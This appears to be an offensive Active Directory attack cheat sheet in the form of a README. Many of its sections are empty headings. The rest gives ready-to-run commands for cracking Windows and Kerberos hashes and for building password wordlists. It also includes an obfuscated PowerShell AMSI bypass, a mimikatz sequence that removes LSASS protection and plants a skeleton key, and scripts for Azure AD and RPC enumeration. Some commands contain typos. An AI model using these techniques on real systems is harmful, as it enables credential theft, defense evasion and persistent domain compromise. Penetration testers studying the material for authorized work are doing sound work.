This AD attacks CheatSheet, made by RistBS is inspired by the [Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet) repo.


<a href="https://ibb.co/z7DSpds"><img src="https://i.ibb.co/pR53cq2/attack-kill-chain-small.jpg" alt="attack-kill-chain-small" border="0" /></a>

# Active-directory-Cheat-sheet
## Summary

- [AD Exploitation Cheat Sheet by RistBS](#active-directory-exploitation-cheat-sheet)
  - [Summary](#summary)
  - [Tools](#tools)
  - [Hash Cracking](#hash-cracking)
  - [Domain Enumeration]()
  - [Local Privilege Escalation]()
  - [Credentials Dumping]()
    - [LSASS Dumping]()
    - [NTDS Dumping]()
    - [DPAPI Dumping]()
    - [LSA Dumping]()
    - [SAM Dumping]()
  - [Brutforce AD Password]()
    - [Custom Username and Password wordlist](custom-username-and-password-wordlist)
  - [RID Cycling]()
  - [Enhanced Security Bypass]()
    - [AntiMalware Scan Interface]()
    - [ConstrainLanguageMode]()
    - [Just Enough Administration]()
    - [ExecutionPolicy]()
    - [RunAsPPL for Credentials Dumping]()
  - [MS Exchange]()
    - [OWA Password Spraying]()
    - [GAL & OAB Exfiltration]()
    - [Exchange User Enumeration]()
    - [PrivExchange]()
    - [ProxyLogon]()
    - [CVE-2020-0688]()
  - [Forest Persistence]()
    - [DCShadow]()
  - [Cross Forest Attacks](#cross-forest-attacks)
    - [MSSQL Server](mssql-server)
      - [UNC Path Injection](unc-path-injection)
      - [SSRP/MC-SQLR Poisoning](ssrpmcsqlr-poisoning)
      - [Persistence]()
        - [DML, DDL & Logon Triggers]()
     - [Trust Tickets](#trust-tickets)
  - [Azure Active Directory (AAD)]()
    - [User Enumeration]()
  - [Miscs](#miscs)
    - [Domain Level Attribute](#domain-level-attribute)
      - [MachineAccountQuota (MAQ) Exploitation](#machineaccountquota-maq-exploitation) 
    - [Abusing IPv6 in AD](#abusing-ipv6-in-ad)
      - [IOXIDResolver Interface Enumeration](#ioxidresolver-interface-enumeration)


## Tools

## Hash Cracking :

LM :
```bash
# using JTR :
john --format=lm hash.txt
# using hashcat :
hashcat -m 3000 -a 3 hash.txt
```

NT :

```bash
# using JTR :
john --format=nt hash.txt --wordlist=wordlist.txt
# using hashcat :
hashcat -m 1000 -a 3 hash.txt
```


NTLMv1 :

```bash
# using JTR :
john --format=netntlmv1 hash.txt
# using hashcat :
hashcat -m 5500 --force -a 0 hash.txt wordlist.txt
```

NTLMv2 :

```bash
# using JTR :
john --format=netntlmv2 hash.txt
# using hashcat :
hashcat -m 5600 --force -a 0 hash.txt wordlist.txt
```

Kerberoasting :

```bash
# using JTR :
john --format=krb5tgs spn.txt --wordlist=wordlist.txt 
# using hashcat :
hashcat -m 13100 -a 0 spn.txt wordlist.txt --force
```

ASREPRoasting :
```bash
hashcat -m 18200 -a 0 hash wordlist.txt --force
```

note : some Hash Type in hashcat depend of the **etype**

## Brutforce AD Password :

### Custom Username and Password wordlist :

create passwords using bash & hashcat with this format : <season><year>
```bash
for i in $(cat pwd_list); do echo $i, echo ${i}\!; echo ${i}2019; echo ${i}2020 ;done > pwds
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u
haschat --force --stdout pwds -r /usr/share/hashcat/rules/base64.rule -r /usr/share/hashcat/rules/toogles1.r | sort u | awk 'length($0) > 7' > pwlist.txt
```

## RID Cycling :

<a href="https://imgbb.com/"><img src="https://i.ibb.co/zPQ6ntJ/rid.png" alt="rid" border="0"></a>

## Enhanced Security Bypass:

### AntiMalware Scan Interface :

```powershell
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```
patching AMSI from Powershell6 :
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
  
### 
  
###
  
###

### RunAsPPL for Credentials Dumping :

[ ❓ ] : [RunAsPPL](https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) is an **additional LSA protection** to prevent reading memory and code injection by **non-protected processes**.

bypass RunAsPPL with mimikatz :
```
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # misc::skeleton
mimikatz # !-
```


## MS Exhchange :

### Exchange User Enumeration :


## Forest Persistence :


## Cross Forest Attacks :

## Azure Active Directory :

### User Enumeration :

First, we connect to Azure Active Directory with **Connect-MsolService**.
```powershell
PS> Connect-MsolService -Credential $cred
```
this command allow enumeration with MFA (MultiFactor Authentification)
```powershell
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```

## Miscs :

### Domain Level Attribute :

#### MachineAccountQuota (MAQ) Exploitation :

use crackmapexec (CME) with maq module :
```sh
cme ldap $dc -d $DOMAIN -u $USER -p $PASSWORD -M maq
```

### Abusing IPv6 in AD :

#### IOXIDResolver Interface Enumeration

it's a little script that enumerate addresses in NetworkAddr field with [**RPC_C_AUTHN_DCE_PUBLIC**](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants) level
```py
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.dcomrt import IObjectExporter

RPC_C_AUTHN_DCE_PUBLIC  = 2

stringBinding = r'ncacn_ip_tcp:%s' % "IP"
rpctransport = transport.DCERPCTransportFactory(stringBinding)
rpc = rpctransport.get_dce_rpc()
rpc.set_auth_level(RPC_C_AUTHN_DCE_PUBLIC)
rpc.connect()
print("[*] Try with RPC_C_AUTHN_DCE_PUBLIC...")
exporter = IObjectExporter(rpc)
binding = exporter.ServerAlive2()
for bind in binding:
    adr = bind['aNetworkAddr']
    print("Adresse:", adr)
```
